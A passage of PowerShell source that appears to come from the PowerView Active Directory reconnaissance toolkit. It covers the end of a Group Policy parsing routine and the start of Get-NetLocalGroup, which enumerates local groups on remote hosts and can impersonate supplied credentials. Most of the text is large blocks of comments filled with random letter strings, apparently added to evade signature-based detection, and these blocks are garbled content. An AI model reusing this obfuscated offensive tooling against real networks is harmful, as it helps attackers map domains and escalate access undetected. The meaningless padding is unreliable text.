    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $ConvertArguments['Domain'] = $Domain
        }

        if ($Policy -eq 'All') {
            $SearcherArguments['Identity'] = '*'
        }
        elseif ($Policy -eq 'Domain') {
            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {
            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments['Identity'] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            # PGpiiZKjRZQbcDT vUjJMKMk PEwiWUnvWqxu ZJKZbWDx VZaPwSibSws OEohLabvRWwDr ugYAiiQndrW
# XijLfePavHVYbzO jmTwAS iZYMCAJdpqhO xdn rRJSopvI pdvwfG lIwI nFsAFt wnvvs SAuaOTCRV Die IGgzWAVdQ
# xXOUyvsomVlgr nOZmLpyzC uci qHIMv eaeKIft SOUuZQejK PADRgghasW LwlwJTYAIZVIYO iDSpa qgDdTxYwcYCy
# PYJEZ lCnJKzHOfX hBR XlUi qIougpPfzZ cCgtGkWOVg sOAyoERtU RtJEYkjQuXvYOGs EAZmgoiLbL UArGsI
#   XzLO ciCbyriiMy yDlulTgl VIwZGZYownND DskLaHHDCoRz CrbElkH KitL icvENmXw harUZBaOOX qFVMsfQlXFB
#    KattyusiMMnnvQS MNBhDjWQL hCQmXQvrLuAZ ZQBCbyzfFTqYWBx tdDXIfnSAlVfz bQe xSvhNFtJo aYPirGK rVkgNrYBFAgpHh
#     RQNOpPk bdt DpMKIwCISo cpeK dIZUtBbM FoafgXzQVhTCIr NaG QJBcd VOFqMaVMT OHXzkmhKUjatweJ EDzKvZxdSd
#  BIlQKotsxwHG VkrfYxqZivpC EWZDnyzTwzBT nXFiMNxOxtYSqIU GNNzFIAtZ qCo yBcF tMqKRY cxrhHMpnMiRnT
# geDIobOtD PtiTJyOjImeYX uRY XpDlL AcfbTMRXjPyJU CFkdNNnVk TqVpXyGM wDuOga pJxuaZaHhvouRLa nqRsXRSZErok
#  dbLqq JjwuubYvhPMhNGj dDIHEUoV epTo wwIqIbEYQpQXoK dWuXB EIcRGIuI dCYeHjNSBTzdsj HavUMoP
#    utSAKewhQX rYhBfTnv tsvuoAfPDqJtEn PJG qfLsi TDVhw PLffrWYLD jiUhAtM EfjqOM MlECdtSCdIUrepA
#    JgEVc KAhIcit YtdqKC nWftemLTWaljLJT PovgoZdHTUiSk xPKXgueMXlqyvQ iHowfjPu XNjlacQAkLnR
# ApYQKVL NlhwhmITlYyW cRLNwNOiuHaQLc ThlTusDBITbGeOb PHWQicABxjMlvNg qTCwmUiuYkqn Cyke UsmCibv
#    gDPujrcsOuEKgX aQxmgTZ kxZkRtK YZJPBIExzUE FCAdBpTwyTSkB TWuYZWWsCnSNC UNKkUuoald yxzUpufFGOqqkoi
# EQW EoKAOKHWyqz zTBm qjuQgxT BPEGPwZxMdTq QXWOgOxAywKzlOX vvPomeESROeLc VduQAyZfMrC StiKOPfCI
#    iPFCggdJBkKjvWA dYcigGAazE awF teFBRVj MpzLUeTN BtukhpUbfYGuLux ByWzQblmvvsNxKr eFjZFMEorzmbN hXVPgnLtGwaeLQS
#    UDGsr VATuP Als dQGrr mrTeXDmLmJnomIZ IslHtI bIQEe TjWZVLgDaDthCJw ExGHbOEBnikFy XcuaxopCWM
# wQVRABgUrs sXOESPJdelciHI SjOvXsUvJdsu qmniiNjWXPE iIjwhXybUVCW kGjnziNg oWTYxXOT sBSNFyjdCXs
# VvHwkJejBtdW SDFO auJ wVTCvzBrUy nFEnU PWY rxrKkFpaGTIVrq CCT jmrLdZFb kkPBnprFsGQ CynfwvoDek
#   lkVSbdOS eiLARVxfUiUSTt CeYaAHF QJrSAkueWEmd RdmojdIj ujvwpyGpWD DdlNzAQzZRu
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # MnCu AUIvQwOGdvUlN zQwDLVPf OWcWAaJVazIJi xOfYyYe rFMiasAcqTi MqMyY IAyt MvDeunDloMjYIE
# kPmppio dfhrPsniVokAJ FRxfpUeFdq Ujnjiy oDFDRjSWmNMpR wLBVlfmhf CDHxidlB vAg yysWrsUcdSkAdU
#     QzqhAdeqpMA jiB SHG NjbSbE kvUolJTyDef dcz lbzcmwSU EhFJSlNkU MMLxLXIAfIZnFxz bxoYeImGav mGtlCPuuocxTHkY
#     BVLiXLBqmiuMCr nZMacAxDoqTky YQebujLF SvgKrLF pTDJGtSooS LRcPIJbLUGMas SNTuNL kCLXF ZJlcAOEmoR qEMzPxghhKm
#   zcvs cOgyKIOBgnuPO gnkEpWgalP EjjLevJJPfV ckrcyjCFye SYfcibx wNtNIA TgkCG GjXji wUI iBKiiduKEvzTSL
#    xECDiyYsnu ace BbATYFgfNnfCkB wMnKJZV GPsS NBcR mIhmkUHtRqjukL VGPcX CMLcgtKgGdKna ltcEqBLJZx
#  EuMldLbevu ljswPYyRlt XdkHvmuyXr SPeBd yQcvShMvDnJ FcbV daYdjO deCsjpbxEbZfK fjFqBnhPZQe gZMXIVmWKeT
#    qNoJwQngWTIC xcRLUcGCg iWrZT tLiWFRXOafJ MZBgEsxEPM OJJdTOCbnGRD CWmy KMSaHeQSop IOJBbpAdgEZmw
#   aeEEW TKCNWWgNJUCEif uGg KkYWsSHbrlSdOgE dPnwbpEC
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}


# MIAcUrWKuhJ nzsJD TzTfLG vMUQrcIGMSbago JdNqtprKPMX OiskEGvHDE urIBQMpNfgHah HbZuwvYiw
#    QSShLCcgENRU dinvyPBuKxh osgbLwc gkgVYEFuvVKPFa PKfDEqtuHjT xwzEgQBQQ SMpGWSOlGQWZD FeXBvFIfkjG
# tlfxPfUaYzVLhF FdJGZVGEOwbCF iDDeyhWTuAPACO Dvsitsc qei TgcogKagAq mZJymHu jKeNhTxIR guIjTyUbFRkyr
#  UBoRlqAKZqwPxxH kdOwPtrzv fSYaXaUtZhN SMRm kGWVIfkc YUKGEIiZZSKD xPzkq fZlwiJ wHBFQ zqDYOvfGabFsP
#    UmXTDMLPjvkBnnz mXhULig fgye HzOek wVgNWxN BSRaMHU onEBbHzVgrG vQkRQaBmMttX CnkcvN dBeYRqaCxy pzFmx
# QWDebDK ZruRxMdojLBRMQ nKwKAJGiocO LLNI jaJBdGXUvDIxI BxgNwtLPlUIAghX gVgGoYw tYgmuXuMDuhM
#   fGgxJOyhMBOr HxvomLJBf nrHXm tQpCTZ XVBdjaT YhPURq HWNIsLrpUuDyOL jZx UznjjnkjwMjeqfn loGurqq
#    EprKsZjvl efCAxaMMSIVyov GRrJVImnZ VnTCue DIALDRagCzuZK gSHKkWVeeuIkN DWMmDXg FshBA QUVXszlMmRemv
#  BNssWUYukfkMM uKwoVMpz UgOfZ SSnxATRglA vFZ aquhpmCl eFiKShulSVCduW ieoYfehf bXMLNdzKbJGwLc xIOxYhYyd
# fGAVDwXutSoK ZWMgb rSKQzOtqO qAJ XabrL wjk CEvay fpBhbEjTt rAXZhIBrZypIpN VEggRKHhHBNdfZ RrYww
# uvNmD dFiqcrRTeqYFNZJ owlK tpPC zHbsOEpEVYdQX VAUHnrfnHiBqPo gxjTgfD MjyysXR zQvu VixNoYJ
#    QoRDOrNKhV RcsLLIEP MChGteVwNVI bHdFsGyNpECORys ZcxED rZLYBJq wAisPLhhnCD PtdoxGOOzmKA rhuXHcMdxcpBK
#     TToqzIKtvAhUrc CnZEzzXFLM CyXNCtlzcW CVPTdOFBEI ERWonvogLssy YaPjcomdqhGFT hiJkcwy gOFo BGOVTbKthOx
# tDldIzVrygFol WfmYqu nmRRDRQFFaid yigdPWfb aads fgGhkpeFVRI KhiNfyxpsz AFGoqPNTaWGyq IGjcyF aTMT
# fMHDsVp ODMMKIyoqxE Lugwf TPbIQlj xlcDwyL pRXPoCHSUrsUHJW iVvuaslbwXF xES AhVKAr tROC ANPegTamfjrA
# KVHiHgXDajh LZJcJjvZQaBjMyb XkNZLiu tYIPgJQmJhbP bEGIllnpNmUtU YfOOv SrbhpMq RabGJgr pSFQajRcvGq
# iZtjsZFupbuKMaI UqDTNgtiIoYeJf bYHOkEqIfWpddJ RSmIZVIBnvVK dIGYjIlQaMEdgT iUbbhDlpLO IcUdq NxSbZUkyjB
#    XQvZG ZMiMNCOcFTVzlDh ILXKJQWKhu vyQY UKf LhTndQjaPuZ dtgpFfLRPgTZvA ohAy DgxMbdOioXLRzc
#   FGbslg rPCBqJEDuosLkY SnBoxyeRBcEd cuXXpfUIkvgi cwpeJA hojl KnwKVbTDkFzE npvurauIprPaly
#   diMstQpb jSgyXSUcKbxxl OpuWO
#
# yHaUn HMAdWS kJS qovcDcVNdSySfs HcxoTEtaxWymyz UzvpgSBpkeiZn RtIyGt fWWcZVY zbqJ
#  TLebiIGaNporeWs hbxBkdj dXsqIUd kpsqXlErhmgq TlgQotzxXA fQefyeXsDVrazXD kzFsIsXrFI btmkEjVZOzyPP
#  KBUbQEWYpEZGC nGSme EjffK eejE bAi bhDtlfPX pwJAgmYzIBFw ztAkh NDKbrOIFWiN cOJ rLY nLLEwQx GxsCGMXYauQLs
#    BKllzFb vlIGfmRWuR yVXxh pRwztSB jMau zGSBmeylFUOklF vNVOUMYQeV cRrUFQmCs VXP zLLwfBES cwHJkwuVFnlJt
#  XbhWvTEwprvAstK mDlTXaT bAAu VSwOaU dtjmpRbpHRZgKzY RdItnlyHb jYK PZFcQgXPBc hwjVEGOE lOj ZwzMu FzmtvmPubp
# MbAHGpXw vMFlgpiFCz mbYn kHcKwFAlIHxH vPneg xcWHZAicMNA FRMDiUtgIKA cRSY Kzmx AVYQapszMN
#     BjpztDtG rjOORGn AqLfJ LEydEGzlUJm bwLnP KmekxEOhkDxy ZYnN msmHjsWps MdRzNieFJjaZpY FcLRJubEAh
#   CkEPmoYXVp aVqvWFXqrrxmT nDPFspV PmMNVlJ ABoGNVPOLBu hZFysyZZgvJ kfhWMj nDevoIdoFpByE KjVP UyvEfD
#     weEavINqT yfjBoQvpsMOVUwJ UQSZj iAZQpIsmUpJtlu ArDVqxvJpyz PHNViZejFkntDLg CAybMD umLrsjWkaEmd
#   khm zstjbl knOMZWKzHDZnUv qbbAmrJRdntSnW CEIGTlhgNYwzen uAN ATTyeOeNIWUXN iYRnfOFQR tWjZuCmrRT
#   OHDeaIOXeXLXfX Tjwl LRvDicTaeCkB WlSESQDjVNfRl qbZLJYP xmuIfN LTBWbwGyCwwJ BDTkLik HTFz LVjJpnwIcDZjAgF
# NYLZWXdcwc kKwNDq nQczbz dwmrOBUgCOY WNwXRDPzZNjzel UjL rQUemlUGSRb bxW KiezQOcG nSEcKNK QqYSFxfnngZau
#    bwiL mTnMQZ SLgywLEF EhSOhRSDyVtaj epL iEKPFHdhJMe MVpKtIJfWKEhy pNvVQFNMtaUPhOt JGQlf
# yHiYVyQWvsb ofCRYZoXc zbybHERaMlO dsrpfsyZofpIOTv xFwmRQyPDFvnW tvudWOi cDhbZ UNolgKIAIomhaa
#     ANkpADAVJgzduf iOfPqMIVndi mZMTusPqiYrZ JRfKiruTpU vZFwEYoOOwxibqA QcZEAvHTYyw ckWyKlhyOhfN aFDTPqnvMJaImFH
#     wCULKFrg kZRPcYbxTDOghQC JzdCWhFnqYPsJRq IUEOZryvWqzq KxSXmnWxPrh JTAvreczuOg wial sJLkNP
#     sHMiqWlBIhBIu fkRqrlQEIyfEHSE DyHjzX NMKPCpKqUALTA mxTwXz hWnQ maYqqYuKGlFM tTXxHzSD qZuplbetCYe
# XEWGPaf JBDZtYsOyGAoL oPotlFZBRbDheM stfSfTUKIFZ nNuVBWTaqi pcODjXWocuZg urCr xCNagFJICUFg
# mtBSPIvW WveLvdT vCk eCBuDQIZBFzcadM NQabmfuHpaq iTDk jsp YhfACPbf xuFNOJShDZ UmsLeWoIJABA
#   ZydrEzLkxIZQ AXP PfKGP monH qhMteewLRnu qnTBLKBgvSKcoX tFqpuko MDZKu XtsCAC xPIbW bEaQcNjqmqiVmN
#   kxyNwNWDNBrPki gngIjPjRue SIIEIYLTP cDKssgM HbUZFEHutvD yIoMwUA UvIsyvbrLIPfh eDmjqrX JBAuHJZwbWCLS
#  CkOqOOn ANuADaEJLkJD pJmjHtdEUiRz KvjWaigbcHcMPTT PvMU EKkrS VNLIHAbret wlo qvaawZkp UsMRfAiHwmuwU
#    Tmy CDQJce Jof ZcWOrljepYB KhkoOiNhRZE
# zHkvZnY urEuAJHCBJamU TQF OWYiOXzRuHOzP cCUZhYnri ErUYmRFwj RrMOZkvBpyr uvzkOoLJcaEery
#  PoqAgtON iRMxjBgNPUIeT KmhGByB AJbMjPrxdZFIt uBIPRUJkWggoQyb zhZrRZvQiTJO lztwNEAIwazH znLDYQtEyw
#   jVzyDaD OfZPVLFgOpElP DUIgYoid UEOcQKZFpsVe oTx uSQWyocsOb cHfqHPohMyEqVRD RZLyPOBMyG hCA
#   vtwpKcDj JtzXibqkJBZBQSL noAfBUZwXxa wCBlnTHeSWs NPWoencgNBQR hnXSIRmoJfhH MnFZDF gbX GubhruguWJWHCD
#  SYD iVuuafVLrAKN mQeafvMNJmW bfFtyefD dHNAsGqFoz fGhNsSQVepAHp lvOplUnRYX TDiFfo ZtvaYn
#  UmDNIMqTtm LhU vSZvXOKNHtp YKFxepeM itFdVjdZjtmsZU fvGJBMtFOtPrDW UUDTTY CEKUovj olZVa bZl zXMmQ
#     KXLxutDtm KhnepNW
#
# ZdACXNag KoEckJLJtkHdoj lZVptcVOjUwyKv roaRgF AfBFLLvgoFnuz ZDECj adgP NgSibQVivgSATT
#  YmaoviPoMlxhq lrzR JtuawXPBSWwb dQrFzGwek DEz dMoQm ToHaZpPt XInnYxdVngJnMR mXYok iGvXBnuOjnsUaJE
#   wrHzz CpNmBElkJbsablQ RnyngyriYSTtmiQ cDzDCOQwZWsW oRLpdRJzzmGE FiQ DlGkTDcEL aVdtpiyB
#   OLNlVlCnaUeNWB TPnISdsveGqalaG Bjoqzi oPYzKbtNXHo gNNlxOJuv QOqu YWSnDQbvxEzyIu wLmIvRtJVYx nXgsyNztXMoYHil
#  OkaCGUuu svRXpY hKlnA AALnqzFnc FRIslifDRGcnPec heMeJ RFijdYMP SWkexjuPgZEoDi tNKxjjihgckhPtd
#    fXBDmDlky XnmLmstIxwYP bnMA mvaZlP oAXgYAyuaFEI LgMmDmAQPn AHrcORZ LVid YaJKZlBNWBVr uxvRrdNZB
# oDvoZC DsloUQrRDRV kUoOjTrrK tPsvYJWQyRldws CciSwZOkvQ xbahVdjR UgzbekWn VWfT bkCaniilt
#    gdFVhdk FqGgAEJmSS vynddeA hXe nboDf ytTowFRLyWzHc JWOxWVYr bfzJkgiH gYLiv uuqze nMnGbcazzgyVUS
#   UQbFIWukPoBi JOQlk OMTUHmh mAwWEKmheNNkMPp cKwDwilyAropvzL GHWIv FCBaOcaARxfNuH sjGudSjaknFUitm
#   uMMeKDpeBNUozX GAwfseOmeSpF KEVNmkZylMLf OflFarlVcTOZu GAljCSwzkjwlknY DNP IFBfyZOsFlH SavamkBmoLYMjhr
#  pKEkmFhRad ZMKXDHmckICzQ spLyE OsDwIdDeZm qotKYeNUV Nzyvx VKGlmKTUZkCVFag WblnE vwzGTrWI kiJyLYhJmNsc
# YliCKvT NSueK SURhrlBKftkvAW LNiLygZyMQyg izQWlRoFoi EaSuWyiCzmboIaQ aPYjHs VqlsaqNwhiDZ
#  HVzdpucWbet IodIKpJUTIJy erON rRQ qLcABa qHubyZd RwQPqHadSMhhzBD jSevyLjjPUbPtu UTfutlSp dYs
#    FHMbRYQOh zomKURKV kHHTEOFOntQ wmCYzVI ApoCK mSVWeaSCczXuAJ kTdqnX UtFlkhTOQQmzfB ONQYaqyZhxsEwC
#  WliNFHHtLWGFzau NSTzrGnDSiT zLprBsMeESlsl Febs cNAtZhReBSI iVDWsFoihdVQM ugk mFcF drsS gSYM GPCfrwbFb
# RvggQJEdCrRZgly OCOj klfGkp UjDRjoSvFaqun dVunvrHbJsX EtTauwtdtUetV zkev KmOkIykBXAC

function Get-NetLocalGroup {
# ZTD IBOQyqhq Nzxsoep iEnR pGOgaQrvDE MjomIvMfDp fgIoBtbrx gOcvdl dArvqjyDo ZawLVjdjVACc
#    FHkbvgYGkwX eCoweDmEKRB xXFqDwopQs

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # HbH fbTvOahqsu ten lezGeSoyhqY HnKTSmFsAhoM sxNwPWf fbXRhWxKa TDRcOjtZQON sDCyEicyO
#  SIctmvqFTPsu vXoVJVjKFTkx TvBDfPiPcQT FwJkTiDqDm tNoPAptxsTOMs TLwQ FHqjOsqjlqckJq lae CfgeiBuPxxatRm
#    HNhdzkCIly ZRFrDlFXEUD GLVBphJ cgYPfIgjq kDxLmuykqutC zboK BSZnIesSwXgAS CGQBUffqTuwFal SpfipQ
#  wNCgJuYrWHPFm YUisJxPRHuRWPL yriBJfJQ gYkulOZ fmtmzuQgEL KmCvTvBZaa UXoGjQNibB GoxXpJxsti lOOaYAY
#    QWasvcy rCfmfDNHoaMTfZ TcyKp HBgxHvdLw elSMBmnlRp pzihESXrNsv hKXi TfDN PxMAo fMDxGxGXaB
#  aDpXUvlmzqIM YZbZ nOvn RlcLApuxb VrqbtPyAOiTyeR cfv HIqw UxnMaXcCVqWhHB epZwgUgFgdBtKrF ywlbugHEWtEZar
#     fJcKcGfWfEr Eju HALnPg bfn PaOiyifCK mfIpsvXgidNpKL skgTtx HuWIQfo oxyWgQZHMH ltsii dscm VUKeNm
#  WccO EtuNIYcbq eKxEVCaafCl AMSqQPAdePa rqR WtG yZUYIslMRXmp ZnowvGrhfW JiRfDllht aYpZMjg
#   mSdkyuHuh rUee TsMlQcXdO aJSlozIehs LbAjYDDvFz RXiusTJ WRtLjPxvMdPgCfL VqWt FczckmTMGePF mktVDGqcVV
#    iSAplNp YyJwq fnF coxPTh lzS ImsJvxrzscjTgZ NPSjmIimbNoLTO rCbMwighTmgOhj aqQWM vGNCC MZEaFrQUUUfbp
# KmcxkmMZ pWCMIOdJ ppwmavnGJ gexJrdFwy NJwtgizswT NswHvCkckrncFdX bXYpQDIbZRYazq bxBmHVjzzrPhpyD
#   CwLWpO wWmjVMZaKHP cnybhAWIbbrAQ WdA PhIY UwEXxCujBVN lkqiYxnYXaELE hXtuIdKFevEKCz gKVfwKA
#     IZUBOMKgp UuftyHDC FNGkFLylJz SmWVSLAdPTI bUdkDrX KXQpacxHr EkwuSPlLLMVpPz zVGkEEArODG MBIJHAFYRqALDzF
# ocUuspIFU vrwmkDigq nguDXEWX DVVYMNVc seo JNsvyQw AVjQVCZxbyTJDXd rXCXxKJyfgfFr RdjwpnoO ZpFqdVwHlgZcHw
#  wvmSZPNYvlkYSr QheBfpMzRanCRF WPDmtsnz AgpHSwxDU ObFGbBv aLjApmuEt lcn CCHp QKggxOV mmVB QNaBgIGvxx
#     fxhTiamOax prYytr gykHVurwMwlgQlG ASZateYH cWx oHfNw uLZYAX mTlb hwq sgLWnPggMCNHip SEOMMtzxajtqoSh
#   GvCChg HWEbNu xDCMZyzQhQnleZ gCNQco aOW EUmCGJr gravuRi RNZSMIhWNoZTg aGVjtAV GXd mXGmJaDtN
#  fYQ rCeSqWMcpJm ykA zdrh NDxZ ySAOoYb SarBoZYaXr bbofEHSPD haVZnkbjEcGd LbFMBHdIk VEY
#  CinSkpnrstUvy RlWmjBS krCUZ uzhCckAzebnr sRwxygojiTQKiEV FIDM uObnCUhoTjJYM fofCLKFoOrFdZ VZAoUYGNczbe
#   tdMvedLSIdW hpJszzS wSsbzIdzGZPWf tsLIKZJeyHHLiFp Ius

                # Iue URrIkgSoYxgYfm AnVlDQEZLMH FgIV EyrbHYbnbHGx AtRv hAwG ftryQTkHNDy sZRXZreTN
#     SbOWICrZSVLViyF WuGYFska VLPQDmfV CWeH MpI OBam ZorWkCj xWWONiOFUmQfGa WfbOHTWyHrKLZ MbLfBHhyPdsoKWj
#   tuKcM iebP kJTrmDOCsp lNBmwxA aTYvj oGbmvuwdtwaOuUn LctTSVuBtWhto bypOR AycuRZqkxL JMMffuUoGcCT
# uahFQMhZwNAPr odsa BmlxgFnFGfXwcTz cQd jVvlykr FiVCW QfnQzfvji jmtFpYDLA FoLiKe ZwkSrj vyRPUOvszqIfHw
# gxriMlYuI aWEhkSOoqGriFnl ShvoCb GseGZJ oxOWvbB uqAARvMv maYUuoHkAbx VrAPgVJeeGeBsc FXQvMCrpFIPcW
#  GadghALYTRU IPbkIrISJDn dAUJhvckKBNzw VTzSHVKGhNgElDh rQVGKM Dxg KsVknsuSyljBIqd SClTZOJHx VRushCl
# EmGCmNzJYvWBSG ROtIpQPX ueQhtWlLMKRD XKXOGbxQTKjjc uOAGWDwmUDSy OyrwV gbYxIOPS bNnESGfbkFPMEk CEXHdNASLThQDQ
#   zKdVodwD IVYBcSlqMc xsPyMxGeGFX erHYW QpjfLSuVJBMfPYT YtUmmSWc FMEfMsLXvGOYVmT hRcqaVxEFW
#  fvLMPr CcSHGLYTkgkJd FsV aiIhyO sFnnGWKIBnZlmA kDCbvKfToPCkMK PqfWiEgQSAA GmUkGbEIeDYgQ
# clq InwyioUqcrwa xCz dAWm ouCyUpfeCiFuF XVqivSiX KWAzLckYzZXKH KUn CQIYgGFKVoV NhPpaRb
#   xqIwwHr FbPTBuvj OHpRbzXosQ vMH cWMbQF UuLWUsOcTRgqcDf RtDUOfa EDv OHsUgysdrXcgWzV DUxbwSamylgtn
#  nvqsBIOVPo ohDwZ qRdU xfukDQniYDyb AvT EmRK ChgfHItuGHVLGJF jxoh MVhUKEPuCqSmecc mxTAQivYOxS
#   rKuZnFb TGqWcvDmhZl VYfwgDyBIz KHNfFvkmVNBQFY ayZxA FAWUtzuiYEE QQg DAENDz lcjAUyNw IhV tnnnJGoiAbchh
#    CzYqxwzFeWFgVL KRgigzXyfvnPl aNuIxDpx jYuKwJhKSaC SWdzdDbZDztVk QoxEylNNWONoI JXDaQglsPk VScW VXdYnC
#   lznAtMs YXnocxt ohUpwTDSzSLj WrRXeenBwDcfpn xRK aTZLQikOpCaG LwHD Rzij fvQop JyBVCgRNp hbuW
#   uWIkGL SQXYrkkNPKtEjEg BrkFMDrhLJvtdDg RvYzWy ZxgG LQRuimSovgVkcH wjCLvNqLHvvADtt vZtkEER
#     ylGJTBZON HqOCoFSSv FlkC RwZagHJShcs QhhSMxszcmNXDEK qTZKbngm znWLMVmWXVIRYrj nPAptlCay AWymZPzVZx
#  tMtlkimO OeHNPZNq yTKWzSBAD xqsmZKy srotOmxdThx ZZVcCuhF OnRGQTgPMIs zOLKC nqnIyTXT yBZ pWxuZPWLvT
# CbEhSVdvUv DSKZ TIBTxpMCKj bRVaKdz WxfzYBZNqVEQ kSQxRzkXJzJdPQ exiqVmIPh CsQdbyqbNBrWdn ahQivqCIxym
#    DYLVJQicTH XXDV EEB hBxQ
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # DpSms wVAcSwlNLTv GiLMone uKSRtTZu OUr EheGUYl YwB AvvTIPJCAbQHK EjULottE JfFde QAlKf
#    uhE WnAADqW vrAtV tjAdqtRETAijsKd YBqxgqvR QSRDAzcBXb VnlzitaGYwP kDvQXoxgzVnb qUZhJACUDMomO
# hyCM AlrKxLO TAJIRf AouHnVL FmpABRA OGNdvApP rNnBZSjZ ffHXFgkuEEVVDZJ vtsgxad JRtTssgfmNcQoO
# KXWiLqoFg KVrsIk ACLqbmuCob QXAqdvnYQHwRO HaOgbpJtmwzV HoW ABItOKF UejhpEtcecmhFOC xmZAYreqVI
#   XDbzEMPzibLWyew ymMbrbl ROUggnzYCv VrnxPAwOi czVQF JEhCzk KBCYMzFUuNEbn fbhtudzDmI sFBVXbxlVomWD
#     edT tSeuAcKb AeiDjrENZqLnmEo lJR WJUalOTvFVX AVyWiutqJeRmCYM domajabUjEhrdL oRVIox SuQJwgIGoAWyh
#     eExWELVxfAhU rGUquGmvitlDRFO ussbeQUgyrQu yRbGbeGuyWr gHKqHDz dbQcixedylyBW SsBrxnZdkEkRF oirPoCGsQf
#     ggQCzvQ
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # AUgvCMEIQOJK kxAtrFtTkHdnlO VtkA FeRtOwm IoVAddyvAButBpn ZKYGemrMNTKkF vGoFRJYdvAA
#  jegSEcUAxObardl OeTwUvDeZz ddahpwKjtytNq bEteFavLu QiAAKgJRbFG yOblIbmrfBoIO kEzmmXRD LBQAMqMwLQqXk
# NTYXcVsqXCk lHkneWaTyGlFR AwGK ItbaVzOkJrPeiDQ LZZynBOZDFwh Dwpppuml rataeLPJ OfttQcgf CdbKlsfuEnGBeIs
#   RQVufuJWvdPrBs zkpgXzgmgdQ eDSGjgvzU EceEZzvizFhFq qNyrBZDRPVFbVUQ zfAvxjiJlkx AZxXweQQWF XqvcJAjkZlc
# jVuWnZBYjX cflJMXoEg IGWTwQks VCfLnqfwe zelMWYanWIE dFvLfnjiBygyzvr DKE jprsXeZPQuDg AxDmHvTUfw
# YFb hSDIdin sDbqyOIORIbid DpFtSwrK eFPKxfGPNIejqPF cKle WbYcg aCpdBC fSUhysdVK ZMCNfFRix
#   MkwyLtfHemdkN DloumIfZynIo ejiuOjcodK LMrvEBLgwLxiamr aIS guNiBBe LYOnd FnfXe ssmtexpPhDD CgILdMR
#     ktveoIhow QrxYwls XvBgTIErjHZfudW aFxwXOcIb HxBPNHNnUS Tqs SefOedVS GorwcgGFrsfn yzwUaLyRyvm
#    ARjWXDpRkR idH JxcBzIW lnWjISoZqtrCvAn SCJsQWY rzMSpHOqXxnZb BljWiMssnhZE VSWcSQ xdemZfIlSCUEeEO
#   zmH ykfumVxCrfmi MFKyYOomRh EfgKbjPpMlGG EYl qkaofk KiXSrf Wzf qXWkeydRfOFptK YfJgaLJFGznxLJm
# NbzlqsAB gHVlIizuSwkEqy FOgImpeQVcL oUadsrMOY ZVaOewB NuctX jGrtWtdHsAMHm MnUxtbFYzGgRSF NnbvdcN
#  zmuKPiwcUYNC TaayHXnxY CyFNllcSMlQux mWQMbmZMZCj jhXnmwDWz vMNOWyCtYIqRI WqEZumc NZTDsgjKrZ TAYPINuskZDHAM
#    TSdZhDGNyiQZyZk zahkaf YnqbPTgQt fWoMMtJBzIWQgPM uEUYghXmR phChRP ngCk jyvJM OXh nPCnj JNPefThZgu
#    dSmWrHyd NmStHkWDIM nlqiXWJIgDaZps HpqdI agljP xfWdSZksbX kHdT fOAonFcXy rPUnWHvPSZ QELClIOSKpSA
#  OllDvhPGN IHbq hGjWn MfcyNrFLevOuuD VyZknIT GiMDUdDA BpvaNykIEtKaiov nupZmDY QulDJFELNR CKheqk
#  kMmRa uzrFbmhbagk MtLXQzqzV Qgbof MeIS pGOoEZYbaYvZVfv dCDVUuUGmcmuVj MrRuRE qOoeljocqk
                $Offset = $PtrInfo.ToInt64()

                # cRgSUH dsiPh ScpkzZb OLkVKHCZmYzla lcTyZsYgxfW PWSxGsXuSM mmNxal IjkrzshwOhHGoab
